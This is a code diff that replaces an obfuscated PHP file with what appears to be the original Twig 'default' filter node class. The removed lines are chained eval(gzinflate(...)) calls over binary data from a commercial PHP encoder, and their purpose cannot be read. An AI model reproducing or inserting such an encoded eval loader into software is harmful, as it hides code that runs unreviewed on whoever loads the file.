@@ -1,13 +1,43 @@
 <?php
- /*
-|#| Message      : File dilindungi oleh undang-undang hak cipta dan disediakan di bawah lisensi.
-|#| Product      : SiiKUN PRO PHP Encoder & Obfuscator
-|#| Author       : SiiKUN TM
-|#| URL          : https://github.com/karyakode/siikunpro
-*/
-eval(gzinflate("­–iOQ†ÿÊ-ÁÈtl#nm£øGÔ¨\$ÀÆÔ˜¨u_ë¸á®u«©VÁ—PÁªÅº\"²¨¨`İÅÔXMgPc¿KÒ“ÉÌœ<÷Ü÷¼÷œ
-8Ï‰¢©0AÉOJ¤÷evñífmè»Ó› ’?£§×¶¼VgÙÎë¨­,È;£Ú.³¨Ï2ëÙaóÏôƒ2Íµb/˜-º}»«“j4×Ÿ}ûaÓ7U¯¸nî”]ËòËâñ+<)È/œÈOzåOßéç7ô=À}%Ñïƒ^³hÖ§/»ãò’nMÙ\\}Uë`ZÅ®Ã>t™¾£µî©wY:šåK d\$ Ì‚ ‰ÑQ~P@d,?&!–Ï‘HÅbş{xçŒR[¯l?lë-é´öVêúfÆÓÔîá+yÎ¯•S_ÖÍ§‰ñ|1±›Ê“¦YsÜ4t”Ÿ™ßEÏuÎü!ı¾ÓæÈ´O1¸ÄhšˆU0¹(YC\$üU}}èÚ`È‚—“Ş±Ì¤İš,,nÕ×•/é;Î*ú©ªCmaÖ¢eÂQ øGcÈŒ®@Ö¼N­ŒÖlÚ\\5ÎƒmÅLİâÀ‘zëêwIKÁ€Fmgr³îQ-*}ÿd…Êê\\?)ÍSZ«ïŠ¦Ë§æ-EŒ©Y4Ë•9ß;°ªÌ¾™>W¶4}Ëguós«çŠSFªr\"»“ã#A­Ü`µóØöQ6Óº_¢(¯ZkÔ©¶VçLÖ±uêÏbİ×ÎÛ¶³aÖÚs4¥ãËk‡×#¹.Un¯idI'“kGÏ7¤„€jÁ’tP§—<'æ\$ˆcaáÃÀU#ô¹YĞ!•\"ÉÆ9î6Å\"GÙ1Š|™SŸ‚e¢¸(I‡%‰‹â²|Àxâÿ¹„İÕ¾ sÍ^´İ´XdZÇğí„Q–ÙmîIÓåÊ«*•x>‚'¶À³ôà£ûâCÆ#A¢ã	ß–ğ4¸Ê(\$vã=
-Z…†â¢À†ì7¼{Øñ“ÂBAzz€‚ôÄDaê‰a£/‘pŞt— ÜÙc¤ÏøÕùy„î!®•ÀçÅ á†'ÅdåO ã÷\$=bàè÷hÈ¹×]õ4<áĞÇá)æKÅ\"ôîƒP\$ˆ’ò9àˆ`şµSş"));eval(÷‡ıáˆä¹¾õ("é.ûúD¢~V·—ós’J>Z(¾Š¼âØ}‰L>opÆ—ˆË¸kÙg<Ä>\\Ä=—:¶ÜO V¯Ğò¤~@ƒ¢?’VÀfèk½¨­ş}î&ê`µÎ«#´N¦õâ‘ğ14wÚˆ¶IŒà•	0åî t
-bäX·ìgoe²’¹1tŒ‘ï†_wø¤%ŒÔ—Ø/\"“–Ã\$'C­~¸…³Tdz*ıS¡ó†+>C+O?±[ë~&û@PK"));eval(¯±Ö›£’ñ˜ÖßË‚ƒâ("ÊğïëÆ“¹ùÒüõÑŠÙŸªÙÄÛÉ¥”›õ³ş¦äãë‚Ü‚–Û³³ÌÏöÜË±õé­İèí½ÖŞêÕ¾€€«³ÏÖøŠÈÿ9ZBfV|‹ö+,²92q.à¼fBÇ/e ÔÁÿŒû«~”_È¥¼şùÖ½ÓÑR5T°ĞËJàÅn‚éoYâb-‘.¦şu›~V÷ü#S½Hd0„}İøœàŠzİ \$Ìn
-Rº\$µBRE¤IËo0nşVñì¤|¯c©ˆlüëÙ±TpïEè£şeI¥ŒÌ™•´^å=qØàá¹Â–ÆÆI'5È(0áp¡Ï^^/¶ÖC*ãWaç'Éwl^‘×èZLv#®°|îd£Hâë,Ï~` Jli%§ÄG	'ÛK½[ ôuK8HgÎìÿMÉ\$™HQÙ3áGñ¨*Ÿ!ÉMÕ™¦uXvM´ºd¢Ã6„m)§¬Ÿ‹‘ïªñkY[kæN<Qê•ŞŸß»q™—²#Zxâp…A¿½óØ>
-3P)ŒMÑ]§®lU½GÉ¿ğO‹Wb]CĞ´Ñµ}¤#‰.„šŸÿıV1·ÚUL^ü½5ÑŞıOğ¤1}e±îÂÆÏ¨Ù¢Ê(¬‡8åÍç¬]Óš|7sq>»¢µĞòu:·ê‡ú¼îşúæÕ3›Æ ŠQíÚÏñÙx­	“k–KqÏOƒ(f³Ì\\k\"Õc§|0G\\,_ş·‘Ü„‹—ÀñÃ€°š¾Á÷ŒÔÜÙ²æ£ßº¬›À¹Ã„¯‚¢‰ôê€çÈÛ©Êù®³õš˜§"));?>
+
+/*
+ * This file is part of Twig.
+ *
+ * (c) 2011 Fabien Potencier
+ *
+ * For the full copyright and license information, please view the LICENSE
+ * file that was distributed with this source code.
+ */
+
+/**
+ * Returns the value or the default value when it is undefined or empty.
+ *
+ * <pre>
+ *  {{ var.foo|default('foo item on var is not defined') }}
+ * </pre>
+ *
+ * @author Fabien Potencier <fabien@symfony.com>
+ */
+class Twig_Node_Expression_Filter_Default extends Twig_Node_Expression_Filter
+{
+    public function __construct(Twig_NodeInterface $node, Twig_Node_Expression_Constant $filterName, Twig_NodeInterface $arguments, $lineno, $tag = null)
+    {
+        $default = new Twig_Node_Expression_Filter($node, new Twig_Node_Expression_Constant('default', $node->getLine()), $arguments, $node->getLine());
+
+        if ('default' === $filterName->getAttribute('value') && ($node instanceof Twig_Node_Expression_Name || $node instanceof Twig_Node_Expression_GetAttr)) {
+            $test = new Twig_Node_Expression_Test_Defined(clone $node, 'defined', new Twig_Node(), $node->getLine());
+            $false = count($arguments) ? $arguments->getNode(0) : new Twig_Node_Expression_Constant('', $node->getLine());
+
+            $node = new Twig_Node_Expression_Conditional($test, $default, $false, $node->getLine());
+        } else {
+            $node = $default;
+        }
+
+        parent::__construct($node, $filterName, $arguments, $lineno, $tag);
+    }
+
+    public function compile(Twig_Compiler $compiler)
+    {
+        $compiler->subcompile($this->getNode('node'));
+    }
+}
